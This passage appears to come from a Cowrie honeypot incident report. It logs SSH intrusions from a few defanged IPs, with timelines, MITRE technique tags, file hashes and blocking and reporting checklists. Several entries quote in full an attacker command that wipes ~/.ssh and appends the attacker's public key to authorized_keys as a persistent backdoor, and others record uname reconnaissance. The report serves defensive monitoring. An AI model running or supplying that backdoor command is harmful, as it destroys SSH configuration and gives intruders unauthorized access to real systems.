| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:52:21` | `cowrie.session.connect` |
| `2026-06-06 10:52:21` | `cowrie.client.version` |
| `2026-06-06 10:52:21` | `cowrie.client.kex` |
| `2026-06-06 10:52:21` | `cowrie.login.success` |
| `2026-06-06 10:52:22` | `cowrie.session.params` |
| `2026-06-06 10:52:22` | `cowrie.command.input` |
| `2026-06-06 10:52:22` | `cowrie.command.failed` |
| `2026-06-06 10:52:22` | `cowrie.log.closed` |
| `2026-06-06 10:52:22` | `cowrie.session.params` |
| `2026-06-06 10:52:22` | `cowrie.command.input` |
| `2026-06-06 10:52:22` | `cowrie.session.file_download` |
| `2026-06-06 10:52:22` | `cowrie.log.closed` |
| `2026-06-06 10:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827df843ffe2

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:52 |
| **Last Seen** | 2026-06-06 10:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:52:23` | `cowrie.session.connect` |
| `2026-06-06 10:52:23` | `cowrie.client.version` |
| `2026-06-06 10:52:23` | `cowrie.client.kex` |
| `2026-06-06 10:52:24` | `cowrie.login.success` |
| `2026-06-06 10:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c26ac585792

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:54 |
| **Last Seen** | 2026-06-06 10:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:54:18` | `cowrie.session.connect` |
| `2026-06-06 10:54:18` | `cowrie.client.version` |
| `2026-06-06 10:54:18` | `cowrie.client.kex` |
| `2026-06-06 10:54:19` | `cowrie.login.success` |
| `2026-06-06 10:54:19` | `cowrie.session.params` |
| `2026-06-06 10:54:19` | `cowrie.command.input` |
| `2026-06-06 10:54:19` | `cowrie.command.failed` |
| `2026-06-06 10:54:19` | `cowrie.log.closed` |
| `2026-06-06 10:54:19` | `cowrie.session.params` |
| `2026-06-06 10:54:19` | `cowrie.command.input` |
| `2026-06-06 10:54:20` | `cowrie.session.file_download` |
| `2026-06-06 10:54:20` | `cowrie.log.closed` |
| `2026-06-06 10:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2d0f06b9b97

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:54 |
| **Last Seen** | 2026-06-06 10:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:54:22` | `cowrie.session.connect` |
| `2026-06-06 10:54:22` | `cowrie.client.version` |
| `2026-06-06 10:54:22` | `cowrie.client.kex` |
| `2026-06-06 10:54:23` | `cowrie.login.success` |
| `2026-06-06 10:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5552bbff60e

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:55 |
| **Last Seen** | 2026-06-06 10:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:55:39` | `cowrie.session.connect` |
| `2026-06-06 10:55:39` | `cowrie.client.version` |
| `2026-06-06 10:55:39` | `cowrie.client.kex` |
| `2026-06-06 10:55:39` | `cowrie.login.success` |
| `2026-06-06 10:55:40` | `cowrie.session.params` |
| `2026-06-06 10:55:40` | `cowrie.command.input` |
| `2026-06-06 10:55:40` | `cowrie.command.failed` |
| `2026-06-06 10:55:40` | `cowrie.log.closed` |
| `2026-06-06 10:55:40` | `cowrie.session.params` |
| `2026-06-06 10:55:40` | `cowrie.command.input` |
| `2026-06-06 10:55:40` | `cowrie.session.file_download` |
| `2026-06-06 10:55:40` | `cowrie.log.closed` |
| `2026-06-06 10:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a3ac4c500e

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:55 |
| **Last Seen** | 2026-06-06 10:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:55:41` | `cowrie.session.connect` |
| `2026-06-06 10:55:41` | `cowrie.client.version` |
| `2026-06-06 10:55:41` | `cowrie.client.kex` |
| `2026-06-06 10:55:42` | `cowrie.login.success` |
| `2026-06-06 10:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8607ed70f75f

| Field | Detail |
|---|---|
| **Source IP** | `49.247.36[.]49` |
| **First Seen** | 2026-06-06 11:00 |
| **Last Seen** | 2026-06-06 11:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 11:00:25` | `cowrie.session.connect` |
| `2026-06-06 11:00:25` | `cowrie.client.version` |
| `2026-06-06 11:00:25` | `cowrie.client.kex` |
| `2026-06-06 11:00:25` | `cowrie.login.success` |
| `2026-06-06 11:00:25` | `cowrie.session.params` |
| `2026-06-06 11:00:25` | `cowrie.command.input` |
| `2026-06-06 11:00:25` | `cowrie.command.failed` |
| `2026-06-06 11:00:26` | `cowrie.log.closed` |
| `2026-06-06 11:00:26` | `cowrie.session.params` |
| `2026-06-06 11:00:26` | `cowrie.command.input` |
| `2026-06-06 11:00:26` | `cowrie.session.file_download` |
| `2026-06-06 11:00:26` | `cowrie.log.closed` |
| `2026-06-06 11:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.247.36[.]49` to AbuseIPDB if not already reported
- [ ] Block `49.247.36[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee7437f8bdd

| Field | Detail |
|---|---|
| **Source IP** | `49.247.36[.]49` |
| **First Seen** | 2026-06-06 11:00 |
| **Last Seen** | 2026-06-06 11:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 11:00:28` | `cowrie.session.connect` |
| `2026-06-06 11:00:28` | `cowrie.client.version` |
| `2026-06-06 11:00:28` | `cowrie.client.kex` |
| `2026-06-06 11:00:29` | `cowrie.login.success` |
| `2026-06-06 11:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.247.36[.]49` to AbuseIPDB if not already reported
- [ ] Block `49.247.36[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4288b68894c

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 11:00 |
| **Last Seen** | 2026-06-06 11:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 11:00:46` | `cowrie.session.connect` |
| `2026-06-06 11:00:46` | `cowrie.client.version` |
| `2026-06-06 11:00:46` | `cowrie.client.kex` |
| `2026-06-06 11:00:47` | `cowrie.login.success` |
| `2026-06-06 11:00:47` | `cowrie.session.params` |
| `2026-06-06 11:00:47` | `cowrie.command.input` |
| `2026-06-06 11:00:47` | `cowrie.command.failed` |
| `2026-06-06 11:00:47` | `cowrie.log.closed` |
| `2026-06-06 11:00:47` | `cowrie.session.params` |
| `2026-06-06 11:00:47` | `cowrie.command.input` |
| `2026-06-06 11:00:47` | `cowrie.session.file_download` |
| `2026-06-06 11:00:47` | `cowrie.log.closed` |
| `2026-06-06 11:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eada5e8eeda

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 11:00 |
| **Last Seen** | 2026-06-06 11:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 11:00:53` | `cowrie.session.connect` |
| `2026-06-06 11:00:53` | `cowrie.client.version` |
| `2026-06-06 11:00:53` | `cowrie.client.kex` |
| `2026-06-06 11:00:54` | `cowrie.login.success` |
| `2026-06-06 11:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc2397360c9f

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 11:06 |
| **Last Seen** | 2026-06-06 11:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 11:06:49` | `cowrie.session.connect` |
| `2026-06-06 11:06:49` | `cowrie.client.version` |
| `2026-06-06 11:06:50` | `cowrie.client.kex` |
| `2026-06-06 11:06:50` | `cowrie.login.success` |
| `2026-06-06 11:06:51` | `cowrie.session.params` |
| `2026-06-06 11:06:51` | `cowrie.command.input` |
| `2026-06-06 11:06:51` | `cowrie.command.failed` |
| `2026-06-06 11:06:51` | `cowrie.log.closed` |
| `2026-06-06 11:06:51` | `cowrie.session.params` |
| `2026-06-06 11:06:51` | `cowrie.command.input` |
| `2026-06-06 11:06:51` | `cowrie.session.file_download` |
| `2026-06-06 11:06:51` | `cowrie.log.closed` |
| `2026-06-06 11:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b62bace23b0

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 11:06 |
| **Last Seen** | 2026-06-06 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 11:06:54` | `cowrie.session.connect` |
| `2026-06-06 11:06:54` | `cowrie.client.version` |
| `2026-06-06 11:06:54` | `cowrie.client.kex` |
| `2026-06-06 11:06:54` | `cowrie.login.success` |
| `2026-06-06 11:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ffe02a6b4d8

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 11:08 |
| **Last Seen** | 2026-06-06 11:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 11:08:33` | `cowrie.session.connect` |
| `2026-06-06 11:08:33` | `cowrie.client.version` |
| `2026-06-06 11:08:34` | `cowrie.client.kex` |
| `2026-06-06 11:08:34` | `cowrie.login.success` |
| `2026-06-06 11:08:35` | `cowrie.session.params` |
| `2026-06-06 11:08:35` | `cowrie.command.input` |
| `2026-06-06 11:08:35` | `cowrie.command.failed` |
| `2026-06-06 11:08:35` | `cowrie.log.closed` |
| `2026-06-06 11:08:35` | `cowrie.session.params` |
| `2026-06-06 11:08:35` | `cowrie.command.input` |
| `2026-06-06 11:08:35` | `cowrie.session.file_download` |
| `2026-06-06 11:08:35` | `cowrie.log.closed` |
| `2026-06-06 11:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98915e890142

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 11:08 |
| **Last Seen** | 2026-06-06 11:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 11:08:38` | `cowrie.session.connect` |
| `2026-06-06 11:08:38` | `cowrie.client.version` |
| `2026-06-06 11:08:38` | `cowrie.client.kex` |
| `2026-06-06 11:08:38` | `cowrie.login.success` |
| `2026-06-06 11:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c85d06793f

| Field | Detail |
|---|---|
| **Source IP** | `103.75.198[.]228` |
| **First Seen** | 2026-06-06 12:04 |
| **Last Seen** | 2026-06-06 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 12:04:25` | `cowrie.session.connect` |
| `2026-06-06 12:04:25` | `cowrie.client.version` |
| `2026-06-06 12:04:25` | `cowrie.client.kex` |
| `2026-06-06 12:04:25` | `cowrie.login.success` |
| `2026-06-06 12:04:26` | `cowrie.session.params` |
| `2026-06-06 12:04:26` | `cowrie.command.input` |
| `2026-06-06 12:04:26` | `cowrie.log.closed` |
| `2026-06-06 12:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.75.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9ae859234d6

| Field | Detail |
|---|---|
| **Source IP** | `103.75.198[.]228` |
| **First Seen** | 2026-06-06 12:05 |
| **Last Seen** | 2026-06-06 12:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 12:05:07` | `cowrie.session.connect` |
| `2026-06-06 12:05:07` | `cowrie.client.version` |
| `2026-06-06 12:05:07` | `cowrie.client.kex` |
| `2026-06-06 12:05:08` | `cowrie.login.success` |
| `2026-06-06 12:05:08` | `cowrie.session.params` |
| `2026-06-06 12:05:08` | `cowrie.command.input` |
| `2026-06-06 12:05:08` | `cowrie.log.closed` |
| `2026-06-06 12:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.75.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-483c8e363186

| Field | Detail |
|---|---|
| **Source IP** | `103.75.198[.]228` |
| **First Seen** | 2026-06-06 12:05 |
| **Last Seen** | 2026-06-06 12:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 12:05:12` | `cowrie.session.connect` |
| `2026-06-06 12:05:12` | `cowrie.client.version` |
| `2026-06-06 12:05:12` | `cowrie.client.kex` |
| `2026-06-06 12:05:13` | `cowrie.login.success` |
| `2026-06-06 12:05:13` | `cowrie.session.params` |
| `2026-06-06 12:05:13` | `cowrie.command.input` |
| `2026-06-06 12:05:13` | `cowrie.log.closed` |
| `2026-06-06 12:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.75.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4313e30021ad

| Field | Detail |
|---|---|
| **Source IP** | `103.75.198[.]228` |
| **First Seen** | 2026-06-06 12:06 |
| **Last Seen** | 2026-06-06 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 12:06:14` | `cowrie.session.connect` |
| `2026-06-06 12:06:14` | `cowrie.client.version` |
| `2026-06-06 12:06:14` | `cowrie.client.kex` |
| `2026-06-06 12:06:14` | `cowrie.login.success` |
| `2026-06-06 12:06:15` | `cowrie.session.params` |
| `2026-06-06 12:06:15` | `cowrie.command.input` |
| `2026-06-06 12:06:15` | `cowrie.log.closed` |
| `2026-06-06 12:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `103.75.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e47ddee900

| Field | Detail |
|---|---|
| **Source IP** | `103.75.198[.]228` |
| **First Seen** | 2026-06-06 12:06 |
| **Last Seen** | 2026-06-06 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 12:06:19` | `cowrie.session.connect` |
| `2026-06-06 12:06:19` | `cowrie.client.version` |
| `2026-06-06 12:06:19` | `cowrie.client.kex` |
| `2026-06-06 12:06:19` | `cowrie.login.success` |
| `2026-06-06 12:06:19` | `cowrie.session.params` |
| `2026-06-06 12:06:19` | `cowrie.command.input` |
